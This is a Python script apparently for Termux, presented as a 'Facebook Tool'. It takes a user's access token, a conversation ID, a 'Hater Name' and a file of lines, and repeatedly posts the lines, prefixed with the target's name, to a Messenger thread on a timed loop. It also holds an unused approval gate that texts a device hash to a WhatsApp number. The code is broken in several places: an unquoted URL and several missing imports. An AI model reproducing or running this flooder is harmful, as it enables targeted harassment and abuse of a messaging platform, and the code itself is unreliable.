from platform import system
import sys
import os
import datetime   
from time import sleep
def testPY():
    if(sys.version_info[0] < 3):
        print ('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
        sys.exit()


def modelsInstaller():
    try:
        models = ['requests', 'colorama']
        for model in models:
            try:
                if(sys.version_info[0] < 3):
                    os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
                else:
                    os.system('python -m pip install {}'.format(model))
                print(' ')
                print('[+] {} has been installed successfully, Restart the program.'.format(model))
                sys.exit()
                print(' ')
            except:
                print('[-] Install {} manually.'.format(model))
                print(' ')
    except:
        pass


import base64
import json
import time
import sys
import os
import re
import binascii
import time
import json
import random
import threading
import pprint
import smtplib
import telnetlib
import os.path
import hashlib
import string
import glob
import sqlite3
import urllib
import argparse
import marshal
import datetime   
from platform import system
from datetime import datetime

try:
    import requests
    from colorama import Fore
    from colorama import init
except:
    modelsInstaller()



def cls():
    if system() == 'Linux':
        os.system('clear')
    else:
        if system() == 'Windows':
            os.system('cls')


cls()
CLEAR_SCREEN = '\033[2J'
RED = '\033[1;37;1m'  # mode 31 = red foreground
RESET = '\033[1;37;1m'  # mode 0  = reset
BLUE = "\033[1;37;1m"
WHITE = "\033[1;37;1m",
YELLOW = "\033[1;37;1m",
CYAN = "\033[1;37;1m"
MAGENTA = "\033[1;37;1m",
GREEN = "\033[1;37;1m"
RESET = "\033[1;37;1m"
BOLD = '\033[1;37;1m'
REVERSE = "\033[1;37;1m"

def logo():
    clear = "\x1b[0m"
    colors = [35, 33, 36]

    x = """
   


/$$   /$$ /$$$$$$$$ /$$   /$$ /$$$$$$$  /$$     /$$
| $$  | $$| $$_____/| $$$ | $$| $$__  $$|  $$   /$$/
| $$  | $$| $$      | $$$$| $$| $$  \ $$ \  $$ /$$/ 
| $$$$$$$$| $$$$$   | $$ $$ $$| $$$$$$$/  \  $$$$/  
| $$__  $$| $$__/   | $$  $$$$| $$__  $$   \  $$/   
| $$  | $$| $$      | $$\  $$$| $$  \ $$    | $$    
| $$  | $$| $$$$$$$$| $$ \  $$| $$  | $$    | $$    
|__/  |__/|________/|__/  \__/|__/  |__/    |__/                           """
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
logo()
testPY()
print('''\033[1;33m---------------------------------------------------------------------\n''')
def venom():
    clear = "\x1b[0m"
    colors = [35, 33, 36]

    y = '''
\033[1;97mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
\033[1;97mâ•‘\033[1;93m* \033[1;97mN4M3    \033[1;91m: \033[1;96mH3NRY \033[1;97m                                                       â•‘
\033[1;97mâ•‘\033[1;93m* \033[1;97mADMIN  \033[1;91m : \033[1;96mH3NRY  \033[1;97m                                                     â•‘
\033[1;97mâ•‘\033[1;93m* \033[1;97m0WN3R   \033[1;91m: \033[1;96mARSH BADMASH  \033[1;97m                                   â•‘
\033[1;97mâ•‘\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;96mhttps://www.facebook.com/Henry.inxide\033[1;97m         â•‘
\033[1;97mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

'''
    for N, line in enumerate(y.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
    	
venom()

#_______approval system________#

# GitHub approval list (Change this URL)
GITHUB_APPROVAL_URL = "https://github.com/Zaibiixd/Approval.txt.git"

# Function to generate unique key
def get_unique_id():
    try:
        unique_str = str(os.getuid()) + os.getlogin() if os.name != 'nt' else str(os.getlogin())
        return hashlib.sha256(unique_str.encode()).hexdigest()
    except Exception as e:
        print(f'Error generating unique ID: {e}')
        exit(1)

# Function to check approval
def check_permission(unique_key):
    approved = False  # To ensure that approval check only happens once
    approval_requested = False  # To check if approval has been requested already
    
    while not approved:
        try:
            response = requests.get(https://github.com/Zaibiixd/Approval.txt.git)
            if response.status_code == 200:
                data = response.text
                if unique_key in data:
                    print(Style.BRIGHT + Fore.GREEN + "[âœ“] Your Approval successful.")
                    approved = True  # Exit loop once approved
                else:
                    if not approval_requested:  # Check if we have already requested approval
                        print(Style.BRIGHT + Fore.GREEN + "[â€¢] Waiting Approval.")  # Display the waiting message once
                        print_stylish_line()
                        approval_requested = True
                        send_approval_request(unique_key)  # Send approval request if not yet sent
                    time.sleep(5)  # Delay for a short while before rechecking
            else:
                print(f"[âœ˜] Failed to fetch approval list. Status Code: {response.status_code}")
                time.sleep(10)
        except Exception as e:
            print(f"[âœ˜] Error checking approval: {e}")
            time.sleep(10)

# Function to send approval request via WhatsApp
def send_approval_request(unique_key):
    try:
        message = f'Hello Henry SÄ«Ä«r! Please Approve My Token: {unique_key}'
        os.system(f'am start https://wa.me/+919235741670?text={quote(message)} >/dev/null 2>&1')        
        # No print statement here, it won't show in the terminal
    except Exception as e:
        print(Style.BRIGHT + Fore.RED + f'Error sending approval request: {e}')
        exit(1)

headers = {
   'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}
        
def message_on_messenger(message):
    for i in ns:
        try:
            message = str(mn) + i
            url = "https://graph.facebook.com/v15.0/{0}/".format('t_' + str(thread_id))
            parameters = {'access_token': access_token, 'message': message}
            s = requests.post(url, data=parameters, headers=headers)
            tt = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
            

            if s.ok:
                e =datetime.now()
                print("\033[1;35m", end = "")
                print("--> Convo Or Inbox I'd Link  :--", thread_id)
                print (e.strftime("--> H3NRY H3R3 :D | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
                print("--> Message Successfully Sent By Arsh Badmash :D ::-->> ", message, "\n")
                time.sleep(timm)
            else:
                print('\033[1;32m[x] Message Block ' + tt, '\n[Ã—] Token Error\n')
                time.sleep(30)
        except Exception as e:
            print("\033[1;31;40m", end = "")
            print(e , '\n')           
            time.sleep(30)

def get_messages():
    try:
        url = "https://www.facebook.com"
    except HTTPError as e:
        print("HTTP Error")
    except URLError as e:
        print("URL Error")


if int:
    print('''\033[1;36m---------------------------------------------------------------------\n''')
    print('''\033[1;35m-=[ Facebook Tool Create by Henry ]=-''')
    print('''\033[1;33m-=[ Contact Us :: https://www.facebook.com/Henry.inxide]=-\n''')
    print('''\033[1;36m---------------------------------------------------------------------\n''')
    i = datetime.now()
    print(i.strftime("\033[1;32m[#] Start Time ==> %Y-%m-%d %I:%M:%S %p "))
    print('''\033[1;32m[#] _ Tool Fucker == > [ Henry Insiide ]\n''')
    print("\033[1;36;40m", end = "")
    mo=str(input("\033[1;36m[+] Mobile Number :: "))
    token = input("[+] Input Token File Name :: ")
    print('\n')
    with open(token, 'r') as f2:
        access_token = f2.read()
        payload = {'access_token': access_token}
        a = "https://graph.facebook.com/v15.0/me"
        b = requests.get(a, params=payload)
        d = json.loads(b.text)
        if 'name' not in d:
            print(BOLD + RED + '\n[x] Your Token.s Expired..!!')
            sys.exit()
        mb = d['name']
        print('\033[1;32mYour Profile Name :: \033[1;32;1m%s' % (mb))
        print('\n')
        thread_id = input(BOLD + CYAN + "\033[1;36m[+] Convo ID :: \033[1;32;1m")
        mn= input(BOLD + CYAN + "\033[1;36m[+] Hater Name :: \033[1;32;1m")
        ms = input(BOLD + CYAN + "\033[1;36m[+] NpFile_Path/ :: \033[1;32;1m")
        repeat = int(input(BOLD + CYAN + "\033[1;36m[+] File Reapeat No :: \033[1;32;1m"))
        timm = int(input(BOLD + CYAN + "\033[1;36m[+] Delay in Seconds :: \033[1;32;1m"))
        print('\n')
        print('''\033[1;34m________All Done....Loading Profile Info.....!''')
        print('\033[1;34mYour Profile Name :: ', mb)
        print('\n')
        ns = open(ms, 'r').readlines()
        

        for i in range(repeat):
            messenger = get_messages()
            message_on_messenger(thread_id)
else:
	print(BOLD+RED+'[-] <==> Your Number Is Wrong Please Take Approval From Owner')
